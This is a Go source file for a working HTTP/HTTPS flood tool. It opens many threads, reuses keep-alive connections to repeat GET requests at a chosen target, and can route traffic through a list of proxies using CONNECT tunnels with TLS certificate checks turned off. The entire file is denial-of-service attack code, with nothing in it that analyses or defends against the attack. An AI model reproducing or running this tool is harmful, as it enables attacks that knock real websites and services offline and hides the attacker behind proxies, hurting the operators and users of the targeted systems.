package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	TLSConfig = &tls.Config{
		MinVersion: tls.VersionTLS12, // 设置最低支持版本为TLS1.2
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		}, // 支持的曲线类型
		InsecureSkipVerify:       true, // 是否需要验证服务器证书
		PreferServerCipherSuites: true, // 使用服务器加密套件列表中的加密算法
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		}, // 支持的加密套件列表
	}
	target              = flag.String("target", "127.0.0.1:8080", "ip:port")
	threads             = flag.Int("threads", 1, "how many threads")
	repeatRequest       = flag.Int("repeatRequest", 70, "abuse keep-alive connection")
	https               = flag.Bool("https", false, "tls1")
	proxies             = flag.String("proxies", "no proxy", "path 2 proxies file")
)


func main() {
	flag.Parse()
	parsedTarget, err := url.Parse(*target)
	if err != nil {
		panic(err)
	}
	targetIPs, _ := net.LookupIP(parsedTarget.Hostname())
	if parsedTarget.Port() == "" {
		if *https {
			parsedTarget.Host, _ = setPort(parsedTarget.Host, "443")
		} else {
			parsedTarget.Host, _ = setPort(parsedTarget.Host, "80")
		}
	}
	if targetIPs[0].To4() != nil {
		// IPv4 address
		*target = targetIPs[0].String() + ":" + parsedTarget.Port()
	} else {
		// IPv6 address
		*target = "[" + targetIPs[0].String() + "]:" + parsedTarget.Port()
	}
	if parsedTarget.Path == "" {
		parsedTarget.Path = "/"
	}
	fmt.Println(*target + "; PATH=" + parsedTarget.Path)
	rand.Seed(1337)
	proxyLines := []string{"no proxy"}
	if *proxies != "no proxy" {
		proxyListBytes, err := ioutil.ReadFile(*proxies)
		if err != nil {
			panic(err)
		}
		proxyLines = strings.Split(string(proxyListBytes), "\n")
	}
	// defer
	payload := []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + *target + "\r\nConnection: Keep-Alive\r\n\r\n")
	for i := 0; i < *threads; i++ {
		go flood(payload, proxyLines)
	}

	// 等待 60 秒后退出程序
	go func() {
		time.Sleep(60 * time.Second)
		os.Exit(0)
	}()
	select {}
}
func flood(payload []byte, proxies []string) {
	for {
		if proxies[0] == "no proxy" {
			no_proxy_flood(payload)
			return
		}
		proxyURL := proxies[rand.Intn(len(proxies))]
		if *https {
			proxied_https_flood(proxyURL, *target, payload)
		} else {
			proxied_http_flood(proxyURL, *target, payload)
		}

	}
}

func no_proxy_flood(payload []byte) {
	for {
		if *https {
			tlsConn, err := tls.Dial("tcp", *target, TLSConfig)
			if err != nil {
				fmt.Println(err)
				continue
			}
			for i := 0; i < *repeatRequest; i++ {
				_, _ = tlsConn.Write(payload)
			}
			tlsConn.Close()
			continue
		} else {
			conn, err := net.DialTimeout("tcp", *target, time.Duration(*threads)*time.Duration(15)*time.Second)
			if err != nil {
				continue
			}
			for i := 0; i < *repeatRequest; i++ {
				_, _ = conn.Write(payload)
			}
			conn.Close()
		}
		continue
	}
}

func proxied_https_flood(proxyAddr, targetAddr string, payload []byte) {
	for {
		proxyConn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)
		if err != nil {
			return
		}

		// Send CONNECT request to proxy
		proxyConn.Write([]byte(fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", targetAddr, targetAddr)))
		reply := make([]byte, 1024)
		n, err := proxyConn.Read(reply)
		if err != nil {
			fmt.Println(err)
			return
		}
		if len(string(reply[:n])) < 14 || string(reply[:n])[:14] != "HTTP/1.1 200 C" {
			return
		}
		// Now conn is a transparent proxy connection to the target server
		tlsConn := tls.Client(proxyConn, TLSConfig)
		for i := 0; i < *repeatRequest; i++ {
			tlsConn.Write(payload)
		}
		tlsConn.Close()
		proxyConn.Close()

	}
}

func proxied_http_flood(proxyAddr, targetAddr string, payload []byte) {
	for {
		proxyConn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)
		if err != nil {
			return
		}

		// Send CONNECT request to proxy
		proxyConn.Write([]byte(fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", targetAddr, targetAddr)))
		reply := make([]byte, 1024)
		n, err := proxyConn.Read(reply)
		if err != nil {
			fmt.Println(err)
			return
		}
		if len(string(reply[:n])) < 14 || string(reply[:n])[:14] != "HTTP/1.1 200 C" {
			return
		}
		// Now conn is a transparent proxy connection to the target server
		for i := 0; i < *repeatRequest; i++ {
			proxyConn.Write(payload)
		}
		proxyConn.Close()

	}
}

func setPort(host, port string) (string, error) {
	u, err := url.Parse(fmt.Sprintf("http://%s", host))
	if err != nil {
		return "", err
	}
	u.Host = fmt.Sprintf("%s:%s", u.Hostname(), port)
	return u.Host, nil
}
